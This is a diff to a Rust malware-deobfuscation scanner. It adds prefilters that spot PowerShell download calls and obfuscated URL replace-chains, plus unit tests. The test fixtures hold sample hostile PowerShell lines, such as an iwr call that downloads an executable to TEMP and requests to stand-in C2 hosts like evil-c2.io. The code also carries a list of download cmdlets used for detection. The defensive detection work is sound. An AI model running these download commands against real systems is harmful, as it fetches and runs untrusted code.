@@ -6339,6 +6339,9 @@ fn try_extract_url_from_buf(
 pub fn scan_ps_replace_chain_urls(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_ps_replace_chain_url_atom(deobfuscated) {
+        return;
+    }
     // Collect every `.Replace('A', 'B')` (and `-replace 'A', 'B'`) pair.
     let pairs = crate::aes_chain::ps_extract::find_replace_chain(deobfuscated);
     if pairs.is_empty() {
@@ -6397,6 +6400,21 @@ pub fn scan_ps_replace_chain_urls(deobfuscated: &str, env: &mut Environment) {
             line_hint: "ps-replace-chain-deob".to_string(),
         });
     }
+}
+
+fn has_ps_replace_chain_url_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    (lower.contains(".replace")
+        || lower.contains("-replace ")
+        || lower.contains("-replace\t")
+        || lower.contains("-replace\r")
+        || lower.contains("-replace\n"))
+        && (lower.contains("htxp")
+            || lower.contains("hxxp")
+            || lower.contains("quwd")
+            || lower.contains("http")
+            || lower.contains("ftp:")
+            || lower.contains("file:"))
 }
 
 /// PowerShell char-index-extractor deobfuscation. Family pattern
@@ -6983,6 +7001,9 @@ pub fn scan_js_fromcharcode_urls(deobfuscated: &str, env: &mut Environment) {
 pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
     use once_cell::sync::Lazy;
     use regex::Regex;
+    if !has_ps_bare_url_download_atom(deobfuscated) {
+        return;
+    }
     // Strict allowlist of TLDs we trust — broad enough to cover the
     // corpus's actual hits (rebrand.ly, goingupdate.com, 31yc.com,
     // backupitfirst.com) without firing on `Wscript.Shell`,
@@ -7039,6 +7060,35 @@ pub fn scan_ps_bare_url_downloads(deobfuscated: &str, env: &mut Environment) {
             line_hint: "ps-bare-url-download".to_string(),
         });
     }
+}
+
+fn has_ps_bare_url_download_atom(text: &str) -> bool {
+    let lower = text.to_ascii_lowercase();
+    if !(lower.contains("start-process")
+        || lower.contains("saps")
+        || lower.contains("iwr")
+        || lower.contains("irm")
+        || lower.contains("invoke-webrequest")
+        || lower.contains("invoke-restmethod"))
+    {
+        return false;
+    }
+    if !(lower.contains('\'') || lower.contains('"')) {
+        return false;
+    }
+    [
+        "com", "net", "org", "io", "ru", "cn", "me", "info", "biz", "us", "co", "ly", "gg", "tk",
+        "xyz", "top", "life", "store", "app", "tools", "rocks", "click", "stream", "host",
+        "website", "pw", "dev", "sh", "space", "site", "live", "cloud", "online", "tech", "art",
+        "news", "pro", "cc", "to",
+    ]
+    .iter()
+    .any(|tld| {
+        let dotted = format!(".{tld}");
+        lower.contains(&format!("{dotted}/"))
+            || lower.contains(&format!("{dotted}'"))
+            || lower.contains(&format!("{dotted}\""))
+    })
 }
 
 pub fn scan_inline_b64_urls(deobfuscated: &str, env: &mut Environment) {
@@ -8490,7 +8540,7 @@ mod ps_char_index_extractor_tests {
 #[cfg(test)]
 #[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 mod ps_bare_url_download_tests {
-    use super::scan_ps_bare_url_downloads;
+    use super::{has_ps_bare_url_download_atom, scan_ps_bare_url_downloads};
     use crate::env::Environment;
     use crate::traits::Trait;
     use crate::Config;
@@ -8528,6 +8578,35 @@ mod ps_bare_url_download_tests {
     }
 
     #[test]
+    fn quoted_bare_host_without_path_still_synthesizes_http_prefix() {
+        let s = r#"Start-Process 'evil-c2.io'"#;
+        assert_eq!(urls(s), vec!["http://evil-c2.io".to_string()]);
+    }
+
+    #[test]
+    fn prefilter_allows_supported_quoted_ps_download_invocations() {
+        assert!(has_ps_bare_url_download_atom(
+            r#"iwr -Uri 'rebrand.ly/47i82k6' -OutFile $env:TEMP\f.exe"#
+        ));
+        assert!(has_ps_bare_url_download_atom(
+            r#"Start-Process "goingupdate.com/ptoleqco""#
+        ));
+        assert!(has_ps_bare_url_download_atom(
+            r#"Invoke-RestMethod 'evil-c2.io/beacon'"#
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_generic_dotted_powershell_text() {
+        assert!(!has_ps_bare_url_download_atom(
+            r#"$s = New-Object -ComObject 'Wscript.Shell'"#
+        ));
+        assert!(!has_ps_bare_url_download_atom(
+            r#"Start-Process microsoft.com"#
+        ));
+    }
+
+    #[test]
     fn comobject_wscript_shell_does_not_misfire() {
         // The whole point of the TLD allowlist — `Wscript.Shell`,
         // `Script.Shell`, `Net.WebClient` etc. must NOT be treated as
@@ -8544,6 +8623,32 @@ mod ps_bare_url_download_tests {
         // bare arg list but is too risky without quotes.
         let s = r#"Start-Process microsoft.com"#;
         assert!(urls(s).is_empty(), "should require quotes");
+    }
+}
+
+#[cfg(test)]
+#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
+mod ps_replace_chain_url_prefilter_tests {
+    use super::has_ps_replace_chain_url_atom;
+
+    #[test]
+    fn prefilter_allows_replace_chain_url_markers() {
+        assert!(has_ps_replace_chain_url_atom(
+            r#"$u='htxp://evil.example/p'; $u=$u.Replace('x','t')"#
+        ));
+        assert!(has_ps_replace_chain_url_atom(
+            r#"$u='quwdevil.example/p'; $u=$u -replace 'quwd','https://'"#
+        ));
+    }
+
+    #[test]
+    fn prefilter_blocks_replace_without_url_template() {
+        assert!(!has_ps_replace_chain_url_atom(
+            r#"$name = $name.Replace('a','b')"#
+        ));
+        assert!(!has_ps_replace_chain_url_atom(
+            r#"Write-Host 'hxxp://example.invalid/no-replace-call'"#
+        ));
     }
 }
 
